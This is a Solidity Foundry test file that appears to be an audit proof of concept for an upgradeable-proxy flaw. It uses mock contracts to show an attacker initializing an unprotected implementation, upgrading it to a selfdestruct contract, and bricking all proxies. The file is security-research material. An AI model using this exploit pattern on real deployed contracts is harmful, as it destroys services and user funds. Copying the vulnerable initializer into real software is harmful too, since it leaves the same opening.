// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////
                    MOCK INTERFACES & CONTRACTS
//////////////////////////////////////////////////////////////*/

interface IAccessControlManager {
    function isGovernor(address account) external view returns (bool);
    function isGovernorOrGuardian(address account) external view returns (bool);
}

/// @notice An attacker-controlled ACL that returns whatever the attacker wants
contract MaliciousACL is IAccessControlManager {
    address public attacker;
    constructor(address _attacker) { attacker = _attacker; }
    function isGovernor(address account) external view returns (bool) {
        return account == attacker;
    }
    function isGovernorOrGuardian(address account) external view returns (bool) {
        return account == attacker;
    }
}

/// @notice Minimal UUPS-style proxy
contract ERC1967Proxy {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address impl, bytes memory data) payable {
        assembly { sstore(_IMPLEMENTATION_SLOT, impl) }
        if (data.length > 0) {
            (bool ok, ) = impl.delegatecall(data);
            require(ok, "init failed");
        }
    }

    fallback() external payable {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            let impl := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

/// @notice Simplified Distributor implementation (mirrors the vulnerable pattern)
contract Distributor {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    // Storage layout
    IAccessControlManager public accessControlManager;
    bool public initialized;

    /// @dev Vulnerable: missing _disableInitializers() in constructor
    constructor() {
        // Should call _disableInitializers() but doesn't
    }

    function initialize(IAccessControlManager _acl) external {
        require(!initialized, "already initialized");
        require(address(_acl) != address(0), "zero acl");
        initialized = true;
        accessControlManager = _acl;
    }

    modifier onlyGovernor() {
        require(accessControlManager.isGovernor(msg.sender), "not governor");
        _;
    }

    function _authorizeUpgrade(address) internal view {
        require(accessControlManager.isGovernor(msg.sender), "not governor");
    }

    function upgradeToAndCall(address newImpl, bytes calldata data) external payable {
        _authorizeUpgrade(newImpl);
        assembly { sstore(_IMPLEMENTATION_SLOT, newImpl) }
        if (data.length > 0) {
            (bool ok, ) = newImpl.delegatecall(data);
            require(ok, "upgrade call failed");
        }
    }

    // Some legitimate function user funds rely on
    function claim(address /*user*/) external view returns (uint256) {
        require(initialized, "not init");
        return 42;
    }
}

/// @notice Malicious implementation that self-destructs upon being delegated to
contract SelfDestructImpl {
    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}

/*//////////////////////////////////////////////////////////////
                            EXPLOIT TEST
//////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    Distributor public implementation;
    ERC1967Proxy public proxy1;
    ERC1967Proxy public proxy2;

    address public legitGovernor = address(0xABCD);
    address public attacker = address(0xBADBAD);
    address public user = address(0xCAFE);

    function setUp() public {
        // 1. Deploy Distributor implementation (vulnerable - no _disableInitializers)
        implementation = new Distributor();

        // 2. Deploy a legitimate ACL for the legit deployment
        MaliciousACL legitACL = new MaliciousACL(legitGovernor);

        // 3. Deploy two proxies pointing at the implementation (representing real Merkl deployment)
        bytes memory initData = abi.encodeWithSelector(
            Distributor.initialize.selector,
            address(legitACL)
        );
        proxy1 = new ERC1967Proxy(address(implementation), initData);
        proxy2 = new ERC1967Proxy(address(implementation), initData);

        // Sanity: proxies are functional initially
        assertEq(Distributor(address(proxy1)).claim(user), 42);
        assertEq(Distributor(address(proxy2)).claim(user), 42);
    }

    function test_exploit_implementationTakeoverBricksAllProxies() public {
        // ============================================================
        // STEP 1: Attacker initializes the IMPLEMENTATION directly
        // (not the proxy). PRO-001: missing _disableInitializers()
        // ============================================================
        vm.startPrank(attacker);

        MaliciousACL evilACL = new MaliciousACL(attacker);
        implementation.initialize(IAccessControlManager(address(evilACL)));

        // Confirm attacker controls implementation's ACL
        assertEq(address(implementation.accessControlManager()), address(evilACL));
        assertTrue(implementation.accessControlManager().isGovernor(attacker));

        // ============================================================
        // STEP 2: Attacker upgrades the implementation to a malicious
        // contract whose function calls SELFDESTRUCT.
        // _authorizeUpgrade passes because attacker's ACL says so.
        // ============================================================
        SelfDestructImpl evilImpl = new SelfDestructImpl();

        // Upgrade implementation -> evilImpl, and call kill() in the
        // same tx via delegatecall, executing selfdestruct in the
        // implementation's context.
        bytes memory killCall = abi.encodeWithSelector(SelfDestructImpl.kill.selector);
        implementation.upgradeToAndCall(address(evilImpl), killCall);

        vm.stopPrank();

        // ============================================================
        // STEP 3: The implementation contract is now destroyed.
        // All proxies that delegatecall into it are bricked.
        // ============================================================
        uint256 codeSize;
        address impl = address(implementation);
        assembly { codeSize := extcodesize(impl) }
        assertEq(codeSize, 0, "implementation should be destroyed");

        // Proxy calls now revert / return empty because delegatecall
        // to an EOA-sized address yields no return data for view fns.
        // We assert that the previously-working claim() call no longer
        // returns the expected value (DoS for ALL proxies & users).
        (bool ok1, bytes memory ret1) = address(proxy1).call(
            abi.encodeWithSelector(Distributor.claim.selector, user)
        );
        (bool ok2, bytes memory ret2) = address(proxy2).call(
            abi.encodeWithSelector(Distributor.claim.selector, user)
        );

        // Either the call fails OR returns empty data (no logic to execute).
        bool proxy1Bricked = !ok1 || ret1.length == 0;
        bool proxy2Bricked = !ok2 || ret2.length == 0;

        assertTrue(proxy1Bricked, "proxy1 should be bricked");
        assertTrue(proxy2Bricked, "proxy2 should be bricked");

        emit log("PROVEN: All Distributor proxies permanently bricked via implementation takeover");
    }
}